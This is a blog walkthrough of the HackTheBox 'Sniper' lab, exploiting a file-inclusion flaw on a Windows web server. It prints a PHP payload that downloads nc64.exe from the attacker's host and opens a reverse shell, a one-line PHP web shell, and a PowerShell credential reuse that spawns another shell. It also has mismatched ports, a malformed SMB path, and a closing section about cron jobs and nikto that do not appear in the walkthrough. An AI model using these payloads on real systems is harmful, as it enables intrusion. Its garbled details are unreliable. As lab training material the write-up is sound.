---
title: "Sniper"
date: 2023-06-24T23:52:47+02:00
tags: ["web","windows","smb","LFI"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: /HTB/Sniper.png
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: ""
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "<image path/url>" # image path/url
    alt: "<alt text>" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/pwndside/pwndside.github.io/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---


## Room Information

- Room name: Sniper
- Difficulty level: Medium
- Room link: https://app.hackthebox.com/machines/Sniper

![Untitled](/HTB/Sniper.png)

## Tools Used

- nmap
- gobuster
- whatweb
- smbserver.py
- nc
- python3 -m http.server

## Port Scanning

![Untitled](/HTB/escaneo-sniper.png)

In the port scan we can see that there are multiple ports open, like 80 (web server), 445 (Samba) ...

## Enumeration

As always first thing i'm going to do is:

```bash
whatweb 10.10.10.151
```
![/Untitled](/HTB/whatweb-sniper.png)

This results show me that the JQuery version is relatively outdated, and the machine is Windows.

So let's find something on the web:
 - First thing as always do ctrl+shift+u to see the source code of the page (nothing relevant)

Soon I realized this error that had the page:

![Untitled](/HTB/php-error-sniper.png)

I started trying common Windows files to test if it is a Local File Inclusion (LFI) vulnerability. 
However, this wouldn’t get me far since I can only view files and not execute any commands or view 
directories structure and contents. At most, I could try to brute-force in a search for other files.
I need to find a way to achieve code execution on the machine.

Here I leave the commands I used to test the error until I realized that I was indeed facing a vulnerability:

```bash
http://10.10.10.151/blog/?lang=test
http://10.10.10.151/blog/?lang=\Windows\System32\Drivers\etc\hosts
http://10.10.10.151/blog/?lang=\inetpub\wwwroot\index.php -> with the intention that I return the php code of the page
http://10.10.10.151/blog/?lang=php://filter/convert.base64-encode/resource=\inetpub\wwwroot\index.php -> with the intention 
that we do not interpret the PHP code
```
Now instead of try to introduce a local element of the machine, I'm going to try to introduce a extern element of my
fisical sistem:

 - The first attempt was to open a web server with `python3 -m http.server 80` and then modify the url of the machine 
   like this `http://10.10.10.151/blog/?lang=http://10.10.14.5/nmap`, to try to point to my address and see 
   if I received any requests. Nothing well.

 - The second attempt was to create a server with SMB  with `smbserver.py smbFolder $(pwd) -smb2support` to share the 
   smbfolder folder and modify the url as follows `http://10.10.10.151/blog/?lang=//10.10.14.5/smbFolder/test`. 
   We have connection !!!

   ![Untitled](/HTB/smbserver-sniper.png) 

   what should happen is that we would have to see the NTLM hash of version 2, but in this case it does not come out, 
   so maybe we are having a problem with the service we are offering, and we are also supporting version 2 of smb. 

 - The third attempt was to use the same command on our system `smbserver.py smbFolder $(pwd) -smb2support`, but in
   this case I put this files {escaneo, nc64.exe, exploit.php } inside the directory we were sharing via smb with the victim machine.

   I personaly create a php code that which downloads the payload.php to a temporary directory that we create on 
   the victim machine, and then executes it. Before modifying the url of the web page so that it 
   points `http://10.10.10.151/blog/?lang=\10.10.14.9.9\smbFolder\payload.php` to our shared smb server, we have 
   to raise the server on port 8000 in our kali with `python3 -m http.server` and listen on port 4444 to receive
   the reverse shell with `nc -nlvp 443`, and ready!

   The content of payload.php is:

	```php
	<?php
        function uploadFile($file){
                $url = "http://10.10.14.9:8000/" . $file;
                $file_name = "C:\\temp\\" . $file;
                if(file_put_contents($file_name, file_get_contents($url))){
                        echo "File download successfully";
                } else{
                        print($file_name);
                        echo "File downloading failed";
                }
        }

        function makeTempDir(){
                system("mkdir C:\\temp");
        }


        function reverseShell($shell){
                system("C:\\temp\\nc64.exe 10.10.14.9 4444 -e " . $shell);
        }

        $file = "nc64.exe";
        $shell = "powershell";

        makeTempDir();
        uploadFile("nc64.exe");
        reverseShell($shell);

	?>

	```

   This is more or less the set:

   ![Untitled](/HTB/previo-sniper.png)

   Then, the machine pawned jejeje

   ![Untitled](/HTB/reverseShell-sniper.png)



 - Other posible way is instead using payload.php is using this php code:

	```php
	<?php
		system($_REQUEST['cmd'])
	?>
	```

   Which allows us to use the url as if it were cmd:

   ![Untitled](/HTB/otraForma-sniper.png)


## Escalation of privileges

The first I do is `whoami` to kwnow what user I'm using. Then I search for any interesting document
like a *.db where I found a password `36mEAhz...`  and a user called Sniper.

![Untitled](/HTB/psw-sniper.png)

Then I use this command -> `net users` to know how many users there are in the Sniper machine and his names.

After thatI realized that we can use powershell and declare some variables like credentials, password,
and user, to use a Invoke-Command on user Sniper/chris and send a revershe sell to our kali.

```bash
$user = "Sniper\chris"
$password = ConvertTo-SecureString '36mEAhz/B8xQ~2VM' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $password)
Invoke-Command -Credential $cred -ComputerName Sniper -ScriptBlock { \\10.10.14.9\smbFolder\nc64.exe 10.10.14.9 443 -e cmd }
```
In me Kali I'm listenning the 443 port using -> `nc -nlvp 443`
Before that we have the user **chris**, and the Flag !!!
## Leason Learned
- What insights did you gain from the room?
    
    I acquired knowledge on the functioning of a cron job and discovered ways to exploit it for potential machine compromise.
    
- Were there any novel tools or techniques employed?
    
    Notably, the utilization of nikto and various reverse shells were introduced.
**Thank you for reading, and happy hacking! 😄**
